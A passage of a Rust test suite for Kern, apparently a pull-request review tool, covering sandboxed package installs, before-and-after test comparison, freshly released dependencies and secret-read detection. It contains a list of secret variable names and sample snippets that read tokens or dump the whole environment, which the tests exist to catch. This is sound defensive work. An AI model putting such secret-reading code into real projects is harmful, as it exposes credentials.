    assert_eq!(suite::repair_steps(&ws, &missing, Some("packages/mcp"), ("packages/mcp", &["pretest".to_string(), "build".to_string()])),
        [("packages/mcp".to_string(), "pretest".to_string()), ("packages/mcp".to_string(), "build".to_string())], "pretest runs once");
}

#[test]
fn a_package_without_a_test_script_runs_the_runner_its_own_config_names() {
    let only = |files: &'static [&'static str]| suite::by_config(move |f| files.contains(&f));
    let (jest, _) = only(&["jest.config.ts", "project.json"]).expect("nx keeps a package's tests in jest.config.ts and runs them through project.json");
    assert_eq!((jest.runner, jest.command), (kern::policy::Runner::Jest, vec!["/workspace/node_modules/.bin/jest".to_string()]));
    let (vitest, _) = only(&["vitest.config.mts"]).unwrap();
    assert_eq!(vitest.command, ["/workspace/node_modules/.bin/vitest", "run"]);
    assert!(only(&["vite.config.ts", "project.json"]).is_none(), "a vite config alone is an app, not tests");
}

#[test]
fn a_test_script_kern_cannot_follow_is_named_when_kern_runs_a_runner_directly() {
    assert_eq!(suite::guessed(&json!({ "scripts": { "test": "gulp   travis" }, "devDependencies": { "mocha": "10.0.0" } })).as_deref(), Some("gulp travis"),
        "testcafe-hammerhead runs gulp; Kern ran mocha on its own and the receipt only said mocha found no test files");
    assert_eq!(suite::guessed(&json!({ "scripts": { "test": "vitest run" } })), None);
    assert_eq!(suite::guessed(&json!({ "scripts": { "test": "turbo run test" } })), None, "a script that hands the tests to each package is followed, not guessed");
    assert_eq!(suite::guessed(&json!({ "devDependencies": { "mocha": "10.0.0" } })), None, "no script, nothing to explain");
}

#[test]
fn a_test_file_that_fails_on_the_new_code_with_no_record_of_passing_on_the_old_code_is_not_a_block() {
    let before = report(&[("test/a.test.ts > works", 1, 0, 0)], &[]);
    let after = report(&[("test/a.test.ts > works", 1, 0, 0)], &["test/b.test.ts"]);
    let c = suite::judged(&before, &after, Some(&after), None);
    assert_eq!(c["new_problems"], json!([]), "promptfoo's old run stopped early, so b never ran there and nine files were blocked: {c}");
    assert_eq!(c["unproven"], json!(["test/b.test.ts"]));
    let ran = report(&[("test/a.test.ts > works", 1, 0, 0), ("test/b.test.ts > loads", 1, 0, 0)], &[]);
    let c = suite::judged(&ran, &after, Some(&after), None);
    assert_eq!(c["new_problems"], json!(["test/b.test.ts"]), "a file that passed on the old code and no longer loads still blocks: {c}");
}

#[test]
fn sides_set_up_differently_are_named() {
    let setup = |old: &str, new: &str, parts: Value| json!({ "old": { "installs": [{ "dir": ".", "manager": "npm", "result": old, "parts": [] }] },
        "new": { "installs": [{ "dir": ".", "manager": "npm", "result": new, "parts": parts }] } });
    assert_eq!(suite::setup_differs(&setup("installed", "installed", json!([])), ""), None);
    assert!(suite::setup_differs(&setup("installed", "installed from package.json (the lockfile is out of date)", json!([])), "").unwrap().contains("lockfile"),
        "dependencies installed two different ways can differ in version");
    assert!(suite::setup_differs(&setup("installed", "installed", json!(["@rollup/rollup-linux-x64-gnu@4.20.0"])), "packages/web").is_some());
    let steps = |exit: &str| format!("building\nkern-step packages/lib build exit {exit}\n");
    assert_eq!(suite::uneven_steps(&steps("0"), &steps("0")), None);
    assert!(suite::uneven_steps(&steps("0"), &steps("1")).unwrap().contains("packages/lib build"), "a build that worked on one side only");
}

#[test]
fn failures_on_sides_set_up_differently_or_without_proof_are_not_verified_never_a_block() {
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [] });
    let rules = json!({ "changed": [], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "lockfile": [], "agent_notes": [], "not_checked": [] });
    let tests = json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 2, "failed": 0, "skipped": 0 }, "after": { "passed": 1, "failed": 1, "skipped": 0 },
        "kept": 1, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [], "not_run": [],
        "uneven": ["test/a.test.ts > adds"], "uneven_why": ["the old code's dependencies were installed and the new code's were installed from package.json"],
        "unproven": ["test/b.test.ts"] });
    let r = receipt::build(&d, &rules, &tests, &json!({ "status": "OFF", "why": "no AI key" }));
    let kinds: Vec<&str> = r["unverified"].as_array().unwrap().iter().filter_map(|x| x["kind"].as_str()).collect();
    assert!(kinds.contains(&"test-uneven") && kinds.contains(&"test-unproven"), "{kinds:?}");
    assert_eq!(r["decision"], "unverified", "{r}");
}

#[test]
fn a_dependency_update_is_routine_only_when_its_release_has_been_out_a_week_within_the_same_major() {
    use kern::deps::{age, floor, rfc3339};
    assert_eq!(floor("^1.6.0"), Some((1, 6, 0)));
    assert_eq!(floor("~0.4"), Some((0, 4, 0)));
    assert_eq!(floor(">=2 <3"), Some((2, 0, 0)));
    assert_eq!(floor("1.2.3-beta.1"), Some((1, 2, 3)));
    for odd in ["workspace:*", "npm:other@1.0.0", "github:a/b", "latest", "*", "file:../x"] { assert_eq!(floor(odd), None, "{odd}"); }
    assert_eq!(rfc3339("1970-01-01T00:00:00.000Z"), Some(0));
    assert_eq!(rfc3339("2000-03-01T00:00:00Z"), Some(951_868_800));
    let now = rfc3339("2026-10-16T12:00:00.000Z").unwrap();
    let old = |_: &str| rfc3339("2026-09-01T00:00:00.000Z");
    let new = |_: &str| rfc3339("2026-10-14T09:00:00.000Z");
    assert_eq!(age(Some("^1.6.0"), Some("^1.9.0"), &old, now)["age"], "routine");
    assert_eq!(age(Some("^1.6.0"), Some("^1.9.1"), &new, now), json!({ "age": "fresh", "version": "1.9.1", "days": 2 }),
        "chalk and debug were hijacked with patch releases that lived a few hours");
    assert_eq!(age(Some("^1.6.0"), Some("^2.0.0"), &old, now)["age"], "major");
    assert_eq!(age(Some("^0.3.0"), Some("^0.4.0"), &old, now)["age"], "major", "a 0.x minor bump may break");
    assert_eq!(age(None, Some("^1.0.0"), &old, now)["age"], "new");
    assert_eq!(age(Some("^1.0.0"), Some("^1.1.0"), &|_| None, now)["age"], "unknown", "a release the registry does not know of keeps its look");
}

#[test]
fn routine_updates_need_no_look_and_a_fresh_release_does() {
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [] });
    let rules = |moves: Value| json!({ "changed": [], "powers": [], "tricks": [], "settings": [], "protected": [], "lockfile": [], "agent_notes": [], "not_checked": [],
        "dependencies": [{ "path": "package.json", "operation": "modify", "packages": ["x"], "moves": moves }, { "path": "package-lock.json", "operation": "modify", "moves": [] }] });
    let tests = json!({ "status": "NOT_RUN", "why": "no runner" });
    let off = json!({ "status": "OFF", "why": "no AI key" });
    let routine = receipt::build(&d, &rules(json!([{ "name": "vitest", "from": "^3.2.0", "to": "^3.2.4", "age": "routine", "version": "3.2.4" }])), &tests, &off);
    assert!(!routine["look"].as_array().unwrap().iter().any(|x| x["kind"] == "dependencies"), "71 of 600 pull requests had a dependencies look: {routine}");
    let fresh = receipt::build(&d, &rules(json!([{ "name": "chalk", "from": "^5.6.0", "to": "^5.6.1", "age": "fresh", "version": "5.6.1", "days": 0 }])), &tests, &off);
    let kinds: Vec<&str> = fresh["look"].as_array().unwrap().iter().filter_map(|x| x["kind"].as_str()).collect();
    assert!(kinds.contains(&"fresh-release") && kinds.contains(&"dependencies"), "{kinds:?}");
}

#[test]
fn the_first_error_is_the_thrown_one_never_a_line_of_minified_code() {
    let yarn = format!("file:///workspace/.kern-install/corepack/v1/yarn/4.10.3/yarn.js:4\n(()=>{{var DGe=Object.create;{}throw new Error(x)}})\n   ^\n\nTypeError: Cannot read properties of undefined (reading 'resolve')\n    at file:///workspace/yarn.js:9:46349\n\nNode.js v22.23.3\n", "var a=1;".repeat(80));
    assert_eq!(kern::sandbox::first_error(&yarn), Some("TypeError: Cannot read properties of undefined (reading 'resolve')"),
        "ipc, storybook and ripl's yarn 4 crash was quoted as 'Node.js v22.23.3'");
    assert_eq!(kern::sandbox::first_error("npm error code EBADENGINE\nnpm error engine Unsupported engine\n"), Some("npm error code EBADENGINE"));
    assert_eq!(kern::sandbox::first_error("Usage Error: Unrecognized or legacy configuration settings found: afterInstall\n"), Some("Usage Error: Unrecognized or legacy configuration settings found: afterInstall"));
}

#[test]
fn a_project_with_no_lockfile_is_installed_with_the_package_manager_it_declares() {
    let t = Temp::new();
    write(&t.0, "package.json", r#"{"name":"lobehub","packageManager":"pnpm@10.18.0","dependencies":{"@lobechat/types":"workspace:*"}}"#);
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!(manager, "pnpm", "npm cannot read workspace: versions; lobehub said pnpm and had no lockfile");
    assert!(attempts[0].0.iter().any(|a| a == "--no-frozen-lockfile"));
    let u = Temp::new();
    write(&u.0, "package.json", r#"{"name":"mono","private":true}"#);
    write(&u.0, "pnpm-workspace.yaml", "packages:\n  - packages/*\n");
    assert_eq!(kern::sandbox::install_plan(&u.0).0, "pnpm");
    let v = Temp::new();
    write(&v.0, "package.json", r#"{"name":"plain"}"#);
    assert_eq!(kern::sandbox::install_plan(&v.0).0, "npm");
    let w = Temp::new();
    write(&w.0, "package.json", r#"{"name":"berry","packageManager":"yarn@4.9.2"}"#);
    write(&w.0, ".yarnrc.yml", "nodeLinker: node-modules\n");
    let (manager, attempts) = kern::sandbox::install_plan(&w.0);
    assert_eq!(manager, "yarn");
    assert!(attempts.iter().all(|(argv, _)| argv.iter().any(|a| a == "--no-immutable")), "yarn 4 makes every install immutable when CI is set, so an install that must write the lockfile has to say so: {attempts:?}");
    write(&w.0, "yarn.lock", "__metadata:\n  version: 8\n");
    let (_, attempts) = kern::sandbox::install_plan(&w.0);
    assert!(attempts[0].0.iter().any(|a| a == "--immutable") && attempts[1].0.iter().any(|a| a == "--no-immutable"), "a stale lockfile is rewritten on the second try: {attempts:?}");
}

#[test]
fn elizaos_eliza_15841_and_c15t_951_a_bun_project_installs_with_kerns_own_pinned_bun_from_its_lockfile_never_with_npm() {
    let t = Temp::new();
    write(&t.0, "package.json", r#"{"name":"eliza","packageManager":"bun@1.4.0","workspaces":["packages/*"],"overrides":{"@elizaos/core":"workspace:*"}}"#);
    write(&t.0, "bun.lock", "{\n  \"lockfileVersion\": 1,\n  \"configVersion\": 1,\n  \"workspaces\": {}\n}\n");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    let bun = kern::sandbox::own_bun();
    assert!(bun.starts_with("/workspace/.kern-tools/bun/node_modules/@oven/bun-linux-") && bun.ends_with("/bin/bun"), "{bun}");
    let plan: Vec<(String, &str)> = attempts.iter().map(|(argv, said)| (argv.join(" "), *said)).collect();
    assert_eq!((manager, plan), ("bun", vec![(format!("{bun} install --frozen-lockfile --ignore-scripts"), "installed"),
        (format!("{bun} install --no-save --ignore-scripts"), "installed from package.json (the lockfile is out of date)")]),
        "npm cannot install what Bun installs: eliza's registry packages that ask for workspace:*, its macOS-only workspace, c15t's wasm32-only binding; Bun installs them from the lockfile as the projects' own CI does");
    std::fs::remove_file(t.0.join("bun.lock")).unwrap();
    write(&t.0, "bun.lockb", "\u{0}bun");
    assert_eq!(kern::sandbox::install_plan(&t.0).1, attempts, "Bun's older binary lockfile is read by the same Bun");
    let ci = kern::sandbox::install_plan_for(&t.0, true).1;
    assert!(ci.len() == 4 && ci[..2].iter().all(|(argv, said)| !argv.iter().any(|a| a == "--ignore-scripts") && *said != kern::sandbox::UNSCRIPTED)
        && ci[2..].iter().all(|(argv, said)| argv.iter().any(|a| a == "--ignore-scripts") && *said == kern::sandbox::UNSCRIPTED),
        "on a throwaway machine Bun runs the install scripts eliza's postinstall needs, and falls back to an install without them: {ci:?}");
    std::fs::remove_file(t.0.join("bun.lockb")).unwrap();
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!((manager, attempts.iter().map(|(argv, said)| (argv.join(" "), *said)).collect::<Vec<_>>()),
        ("bun", vec![(format!("{bun} install --no-save --ignore-scripts"), "installed from package.json (the project has no lockfile)")]),
        "a project that declares Bun and has no lockfile installs with Bun too");
    assert!(kern::sandbox::INSTALL_ENV.contains(&("BUN_INSTALL_CACHE_DIR", "/workspace/.kern-install/bun")), "Bun's cache leaves with Kern's install folder");
    assert!(kern::sandbox::INSTALL_ENV.contains(&("BUN_INSTALL_GLOBAL_STORE", "0")),
        "a bunfig.toml with globalStore = true makes node_modules/.bun links into Bun's cache, which Kern deletes after the install, so no test would load on either side, as PostHog/posthog-js#4869 showed for pnpm's global store");
}

#[test]
fn kerns_own_bun_comes_only_from_a_lockfile_that_pins_its_sha512_for_the_machine_s_processor() {
    for (arch, package, cpu, integrity) in [
        ("x86_64", "@oven/bun-linux-x64-baseline", "x64", "sha512-OKKzX/SOVIUVARCzTg+2r4Rcc4fPyWnQmBsd3K08buxeu7DAof4iwW9zSb6Lt1NhTCu4Uhi8k9UeI6f7GEE4Zg=="),
        ("aarch64", "@oven/bun-linux-aarch64", "arm64", "sha512-3BBP9ovJ2RGHFH6Ae1CAtxNtG1+YY6GD6rmYbsUosoAk9+OEl6zeDQ/k4fBkc6dYOJCtWnx8hUxzNzQATSmvYQ=="),
    ] {
        let (manifest, lock) = kern::sandbox::bun_tools(arch).expect("a Linux processor Kern runs on has a pinned Bun");
        let (manifest, lock): (Value, Value) = (serde_json::from_str(&manifest).unwrap(), serde_json::from_str(&lock).unwrap());
        assert_eq!(manifest["dependencies"], json!({ package: kern::sandbox::BUN }), "{manifest}");
        let entry = &lock["packages"][format!("node_modules/{package}")];
        assert_eq!((lock["lockfileVersion"].as_u64(), entry["version"].as_str(), entry["integrity"].as_str(), entry["cpu"][0].as_str()),
            (Some(3), Some(kern::sandbox::BUN), Some(integrity), Some(cpu)), "npm ci refuses any other bytes: {lock}");
        assert_eq!(entry["resolved"].as_str().unwrap(), format!("https://registry.npmjs.org/{package}/-/{}-{}.tgz", package.rsplit('/').next().unwrap(), kern::sandbox::BUN));
        assert_eq!(lock["packages"][""]["dependencies"], manifest["dependencies"]);
        assert_eq!(kern::sandbox::own_bun_for(arch), format!("/workspace/.kern-tools/bun/node_modules/{package}/bin/bun"));
    }
    assert_eq!(kern::sandbox::BUN, "1.4.2", "the baseline x64 build runs on every x64 processor, AVX2 or not");
    assert!(kern::sandbox::bun_tools("riscv64").is_none(), "a processor Kern has no pinned Bun for gets none, never an unpinned one");
}

#[test]
fn simstudioai_sim_4382_a_bun_project_s_install_scripts_build_steps_and_tests_find_bun_as_its_own_ci_gives_it() {
    let t = Temp::new();
    write(&t.0, "package.json", r#"{"name":"sim","scripts":{"postinstall":"bun run scripts/setup.ts"}}"#);
    write(&t.0, "bun.lock", "{}");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    let bun = kern::sandbox::own_bun();
    assert_eq!(kern::sandbox::launcher(manager, &attempts), Some(vec![bun.clone()]), "the shim in /workspace/.kern-tools/bin that tests and build steps call");
    let dir = bun.rsplit_once('/').unwrap().0;
    assert_eq!(kern::sandbox::install_path(manager), format!("{dir}:/usr/local/bin:/usr/bin:/bin"), "sim's postinstall called bun, and its install failed with `sh: 1: bun: not found`");
    assert_eq!(kern::sandbox::install_path("npm"), "/usr/local/bin:/usr/bin:/bin");
    assert!(!kern::sandbox::adds_platform_parts("bun") && !kern::sandbox::adds_platform_parts("pnpm") && kern::sandbox::adds_platform_parts("npm") && kern::sandbox::adds_platform_parts("yarn"),
        "Bun, like pnpm, installs the Linux parts itself; only npm and yarn trees get the parts npm leaves out");
    write(&t.0, "package-lock.json", "{}");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!((manager, kern::sandbox::launcher(manager, &attempts)), ("npm", None));
    write(&t.0, "pnpm-lock.yaml", "lockfileVersion: '9.0'\n");
    let (manager, attempts) = kern::sandbox::install_plan(&t.0);
    assert_eq!(kern::sandbox::launcher(manager, &attempts).map(|l| l.len()), Some(3), "pnpm's launcher is node, corepack and pnpm, as before");
}

#[test]
fn test_files_that_miss_only_an_unbuilt_package_are_repaired_even_when_others_pass() {
    let mut r = report(&[("packages/app/test/other.test.ts > works", 1, 0, 0)], &["packages/app/test/uses-lib.test.ts"]);
    r.why.insert("packages/app/test/uses-lib.test.ts".into(), "Failed to resolve entry for package \"@adobe/data\". The package may have incorrect main/module/exports specified".into());
    let why = suite::partly_missing(&r).expect("adobe/data's run passed 16 tests while 4,583 tests across 73 pull requests missed an unbuilt workspace package");
    assert!(suite::missing_packages(&why).contains("@adobe/data"));
    let plain = report(&[("test/a.test.ts > works", 1, 1, 0)], &[]);
    assert_eq!(suite::partly_missing(&plain), None, "an ordinary failure is not a missing module");
    assert!(suite::own_build("Cannot find module '../../dist/assembly/index.js' from 'test/a.test.ts'"), "the package's own build output");
    assert!(!suite::own_build("Cannot find module './helpers' from 'test/a.test.ts'"));
}

#[test]
fn mastra_18872_a_build_pass_starts_only_when_the_old_rerun_and_the_new_codes_run_still_fit() {
    assert!(suite::repair_fits(2710, 413, 2 * suite::PREPARE_SECS_MAX), "before the first pass Kern counts both sides' whole build window, then the old rerun and the new run");
    assert!(suite::repair_fits(1815, 745, 150), "after the first pass, the time its builds took");
    assert!(!suite::repair_fits(971, 744, 23), "#18872's third pass rebuilt five packages in 23 s, reran the 744-s suite to the same 7,161 passes, and left the new code 208 s, so its tests never ran");
    assert!(suite::repair_fits(2 * 744 + 23, 744, 23) && !suite::repair_fits(2 * 744 + 22, 744, 23));
}

#[test]
fn mcpjam_inspector_4344_a_build_that_failed_is_named_with_its_error_never_counted_as_done() {
    let log = "> @mcpjam/sdk@6.4.0 bundle:chatgpt-runtime\n\u{274c} Failed to bundle ChatGPT Apps runtime script: Error: EACCES: permission denied, open '/workspace/sdk/src/ChatGptAppsRuntime.bundled.ts'\nnpm error code 1\n\nkern-step sdk build exit 1\n\n> @x/core@1.0.0 build\n> tsc\n\nkern-step packages/core build exit 0\n";
    let failed = suite::failed_steps(log);
    assert_eq!(failed.iter().map(|(s, _)| s.as_str()).collect::<Vec<_>>(), ["sdk build"], "{failed:?}");
    assert!(failed[0].1.contains("EACCES: permission denied, open '/workspace/sdk/src/ChatGptAppsRuntime.bundled.ts'"), "{failed:?}");
    assert!(suite::failed_steps("kern-step sdk build exit 0\n").is_empty());
    assert_eq!(suite::failed_steps("kern-step sdk build exit null\n"), [("sdk build".to_string(), "exit null".to_string())], "a build killed by a signal has no exit code and no error line, and is still a failure");
    let steps = ["sdk build".to_string(), "packages/core build".to_string()];
    let said = suite::ran_first(&steps, &failed);
    assert!(said.starts_with(" (Kern ran sdk build, packages/core build first, but sdk build failed: ") && said.contains("EACCES") && said.ends_with(')'),
        "inspector#4344's receipt said '(even after Kern ran sdk build first)' as if the build had worked: {said}");
    assert_eq!(suite::ran_first(&steps, &[]), " (even after Kern ran sdk build, packages/core build first)");
}

#[test]
fn mastra_18872_an_edited_test_file_that_loads_on_neither_side_is_not_verified_never_a_silent_pass() {
    let edited = "packages/core/src/tools/tool-builder/builder.test.ts";
    let changes = vec![(edited.to_string(), "modify"), ("packages/core/src/tools/tool-builder/builder.ts".to_string(), "modify"), ("packages/core/src/fixed.test.ts".to_string(), "modify"),
        ("packages/core/src/fresh.test.ts".to_string(), "add"), ("packages/web/src/elsewhere.test.ts".to_string(), "modify")];
    let mut old = report(&[("packages/core/src/agent.test.ts > runs", 1, 0, 0)], &[edited, "packages/core/src/fixed.test.ts", "packages/web/src/elsewhere.test.ts"]);
    old.why.insert(edited.into(), "Cannot find package '@internal/core/storage' imported from /workspace/packages/core/src/observability/types/tracing.ts\n at ...".into());
    old.why.insert("packages/core/src/fixed.test.ts".into(), "Cannot find module './gone'".into());
    old.why.insert("packages/web/src/elsewhere.test.ts".into(), "Cannot find module './gone'".into());
    let mut new = old.clone();
    new.why.remove("packages/core/src/fixed.test.ts");
    new.tests.insert("packages/core/src/fixed.test.ts > now loads".into(), Count { passed: 1, failed: 0, skipped: 0 });
    assert_eq!(suite::unloaded_edits(&changes, &old, &new, "packages/core"),
        [(edited.to_string(), "it did not load on the old code or the new code: Cannot find package '@internal/core/storage' imported from /workspace/packages/core/src/observability/types/tracing.ts".to_string())],
        "on #18872 the edited builder.test.ts loaded on neither side; with planted faults dropped for time, the receipt would have said the tests still pass; a test file the change fixes so it loads, a new file and a file outside this suite are not this case");
    let mut d = clean_tests();
    d["edited_unchecked"] = json!([{ "path": edited, "why": "it did not load on the old code or the new code: Cannot find package '@internal/core/storage'" }]);
    let r = receipt::build(&drive_json(), &clean_rules(), &d, &off());
    assert_eq!(r["decision"], "unverified", "{r}");
}

#[test]
fn an_env_file_is_read_the_way_dotenv_reads_it() {
    let text = "# test settings\nexport DATABASE_URL=\"postgres://localhost/test\"\nAPI_KEY='abc def'\nEMPTY=\nPORT=4000 # local\nnot a line\n1BAD=x\n";
    assert_eq!(suite::dotenv(text), [("DATABASE_URL".to_string(), "postgres://localhost/test".to_string()), ("API_KEY".to_string(), "abc def".to_string()),
        ("EMPTY".to_string(), String::new()), ("PORT".to_string(), "4000".to_string())]);
}

#[test]
fn review_2_a10_a_fresh_release_is_its_own_only_when_this_repository_contains_the_package() {
    let t = Temp::new();
    let (r, _) = repo(&t, &[("package.json", r#"{"name":"rl-cli","private":true,"workspaces":["packages/*"]}"#), ("packages/sdk/package.json", r#"{"name":"@runloop/sdk","version":"1.0.0"}"#)]);
    let head = commit(&r, &[("packages/sdk/package.json", r#"{"name":"@runloop/sdk","version":"1.1.0"}"#)]);
    let own = check::own_packages(&r, &head);
    assert!(own.contains("@runloop/sdk") && own.contains("rl-cli"), "{own:?}");
    assert!(!own.contains("@runloop/api-client"), "a package published from another repository, even of the same organization, is not this change's own: a stolen token publishes there with the organization's repository field (Shai-Hulud)");
    let rules = json!({ "dependencies": [{ "path": "package.json", "moves": [{ "name": "@runloop/sdk", "from": "^1.0.0", "to": "^1.1.0" }, { "name": "@runloop/api-client", "from": "^1.6.0", "to": "^1.9.0" }] }] });
    let now = kern::deps::rfc3339("2026-02-26T00:00:00Z").unwrap();
    let fresh = |_: &str, _: &str| kern::deps::rfc3339("2026-02-25T21:42:48Z");
    let out = kern::deps::aged(rules, now, &fresh, &|name: &str| own.contains(name));
    assert_eq!(out["dependencies"][0]["moves"][0]["age"], "internal", "a changesets release bumping a package of this same repository");
    assert_eq!(out["dependencies"][0]["moves"][1]["age"], "fresh");
}

#[test]
fn a_jest_project_with_reporters_of_its_own_keeps_them() {
    use kern::sandbox::own_reporters;
    assert!(own_reporters("{\"configs\":[{}],\"globalConfig\":{\"reporters\":[[\"default\",{}],[\"detox/runners/jest/reporter\",{}]]}}\n"),
        "wix/Detox's tests need jest-metadata's reporter; replacing the reporters made every test file fail to load");
    assert!(!own_reporters("{\"configs\":[{}],\"globalConfig\":{\"reporters\":[[\"default\",{}]]}}"));
    assert!(!own_reporters("{\"configs\":[{}],\"globalConfig\":{}}"));
    assert!(!own_reporters("not json"));
}

#[test]
fn removing_a_dependency_needs_no_look_and_the_receipt_still_names_it() {
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [] });
    let rules = |moves: serde_json::Value, packages: serde_json::Value| json!({ "changed": [], "powers": [], "tricks": [], "settings": [], "protected": [], "lockfile": [], "agent_notes": [], "not_checked": [],
        "dependencies": [{ "path": "package.json", "packages": packages, "fields": [], "moves": moves }] });
    let tests = json!({ "status": "NOTHING_TO_RUN", "why": "x" });
    let off = json!({ "status": "OFF", "why": "no AI key" });
    let removed = kern::receipt::build(&d, &rules(json!([{ "name": "babel-plugin-styled-components", "age": "removed" }]), json!(["babel-plugin-styled-components (removed)"])), &tests, &off);
    assert!(!removed["look"].as_array().unwrap().iter().any(|x| x["kind"] == "dependencies"), "ETH-Taipei#322 removed a babel plugin: nothing new can come in by removing a package: {removed}");
    assert!(kern::receipt::markdown(&removed, None).contains("✅ Dependencies: `babel-plugin-styled-components (removed)`"));
    let added = kern::receipt::build(&d, &rules(json!([{ "name": "react-native-purchases", "to": "9.5.4", "age": "new" }]), json!(["react-native-purchases 9.5.4 (new)"])), &tests, &off);
    assert!(added["look"].as_array().unwrap().iter().any(|x| x["kind"] == "dependencies"), "a new package still needs a look");
}

#[test]
fn reading_a_setting_from_the_environment_is_not_a_power_but_reading_a_secret_is() {
    use kern::capability::{env_names, secret_name};
    let names = |src: &str| env_names("src/a.ts", src).map(|n| n.into_iter().collect::<Vec<_>>());
    assert_eq!(names("export const prod = process.env.NODE_ENV === 'production';"), Some(vec!["NODE_ENV".to_string()]));
    assert_eq!(names("const { PORT, HOST } = process.env; export const at = `${HOST}:${PORT}`;"), Some(vec!["HOST".to_string(), "PORT".to_string()]));
    assert_eq!(names("export const v = process.env['APTOS_CLI_VERSION'];"), Some(vec!["APTOS_CLI_VERSION".to_string()]));
    assert_eq!(names("import { spawn } from 'node:child_process'; spawn('x', [], { env: process.env });"), None, "the whole environment handed on is a bulk read");
    assert_eq!(names("export const all = JSON.stringify(process.env);"), None);
    assert_eq!(names("export const get = (name: string) => process.env[name];"), None, "a name Kern cannot see may be any secret");
    assert_eq!(names("const { A, ...rest } = process.env; export { rest };"), None);
    assert_eq!(names("const { env } = process; export const s = env.SECRET;"), None, "no read Kern can name");
    assert_eq!(names("const g = globalThis; export const s = g.process.env.SECRET;"), Some(vec!["SECRET".to_string()]));
    assert_eq!(names("export const dev = typeof process !== 'undefined' && process.env!.NODE_ENV !== 'production';"), Some(vec!["NODE_ENV".to_string()]));
    assert_eq!(names("export const cwd = process.cwd();"), Some(vec![]), "no environment read at all");
    assert_eq!(names("const p = process; export const s = p.env.NPM_TOKEN;"), None, "process handed to a name Kern does not follow");
    for secret in ["GITHUB_TOKEN", "VELLUM_API_KEY", "DATABASE_URL", "STRIPE_SECRET_KEY", "NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "dbPassword", "SENTRY_DSN", "SLACK_WEBHOOK_URL", "REDIS_URL", "githubToken", "SK_LIVE"] {
        assert!(secret_name(secret), "{secret}");
    }
    for setting in ["NODE_ENV", "CI", "DEBUG", "FORCE_COLOR", "NO_COLOR", "APTOS_CLI_VERSION", "AWELL_ENVIRONMENT", "TAAPI_PLAN", "WEB_UI_BASE_URL", "EVE_PUBLIC_ROUTE_PREFIX", "PORT", "PWD", "NEXT_PUBLIC_SITE_URL"] {
        assert!(!secret_name(setting), "{setting}");
    }
    let t = Temp::new();
    let (r, base) = repo(&t, &[("src/a.js", "export const a = 1;\n")]);
    let settings = commit(&r, &[("src/a.js", "export const a = process.env.NODE_ENV === 'test' ? 0 : 1;\n")]);
    let found = kern::rules::rules(&r, &base, &settings).unwrap();
    assert!(found["powers"].as_array().unwrap().is_empty(), "FWU-DE/ais-chat#1413 reads NODE_ENV in a theme toggle: {}", found["powers"]);
    let secret = commit(&r, &[("src/a.js", "export const a = process.env.GITHUB_TOKEN;\n")]);
    assert!(!kern::rules::rules(&r, &settings, &secret).unwrap()["powers"].as_array().unwrap().is_empty(), "apify/camoufox-js#254 reads GITHUB_TOKEN");
}

#[test]
fn a_lockfile_only_change_is_routine_when_every_version_it_moves_to_has_been_out_a_week() {
    use kern::deps::{aged, lock_moves};
    let old = json!({ "lockfileVersion": 3, "packages": { "": { "name": "app" }, "node_modules/a": { "version": "1.0.0" }, "node_modules/b": { "version": "2.0.0" },
        "node_modules/gone": { "version": "0.1.0" }, "packages/lib": { "name": "@app/lib", "version": "1.0.0" }, "node_modules/@app/lib": { "resolved": "packages/lib", "link": true } } });
    let new = json!({ "lockfileVersion": 3, "packages": { "": { "name": "app" }, "node_modules/a": { "version": "1.0.1" }, "node_modules/b": { "version": "2.0.0" },
        "node_modules/a/node_modules/c": { "version": "3.1.0" }, "packages/lib": { "name": "@app/lib", "version": "1.1.0" }, "node_modules/@app/lib": { "resolved": "packages/lib", "link": true } } });
    let moves = lock_moves(&old, &new);
    let shown: Vec<String> = moves.iter().map(|m| format!("{} {} {}", m["name"].as_str().unwrap(), m["from"].as_str().unwrap_or("-"), m["to"].as_str().unwrap_or("-"))).collect();
    assert_eq!(shown, ["a 1.0.0 1.0.1", "c - 3.1.0", "gone 0.1.0 -"], "the workspace's own package and links are not dependencies: {shown:?}");
    let rules = |m: Vec<serde_json::Value>| json!({ "dependencies": [{ "path": "package-lock.json", "packages": [], "fields": [], "moves": m }] });
    let now = kern::deps::rfc3339("2026-10-16T00:00:00Z").unwrap();
    let old_release = |_: &str, _: &str| kern::deps::rfc3339("2026-09-01T00:00:00Z");
    let r = aged(rules(moves.clone()), now, &old_release, &|_| false);
    assert!(r["dependencies"][0]["moves"].as_array().unwrap().iter().all(|m| m["age"] == "routine" || m["age"] == "removed"), "{r}");
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [] });
    let full = |deps: serde_json::Value| json!({ "changed": [], "powers": [], "tricks": [], "settings": [], "protected": [], "lockfile": [], "agent_notes": [], "not_checked": [], "dependencies": deps["dependencies"] });
    let off = json!({ "status": "OFF", "why": "no AI key" });
    let tests = json!({ "status": "NOTHING_TO_RUN", "why": "x" });
    let calm = kern::receipt::build(&d, &full(r), &tests, &off);
    assert_eq!(calm["decision"], "clear", "Azure/AppConfiguration-JavaScriptProvider#330 only refreshed package-lock.json: {calm}");
    let fresh = |name: &str, _: &str| if name == "c" { kern::deps::rfc3339("2026-10-15T12:00:00Z") } else { kern::deps::rfc3339("2026-09-01T00:00:00Z") };
    let hot = kern::receipt::build(&d, &full(aged(rules(moves), now, &fresh, &|_| false)), &tests, &off);
    assert!(hot["look"].as_array().unwrap().iter().any(|x| x["kind"] == "fresh-release" && x["what"].as_str().unwrap().contains("c@3.1.0")), "a brand-new release deep in the tree is named: {hot}");
}

#[test]
fn the_package_manager_kern_downloads_runs_outside_the_project_so_its_package_json_cannot_change_how_it_loads() {
    let home = kern::sandbox::INSTALL_ENV.iter().find(|(k, _)| *k == "COREPACK_HOME").map(|(_, v)| *v).unwrap();
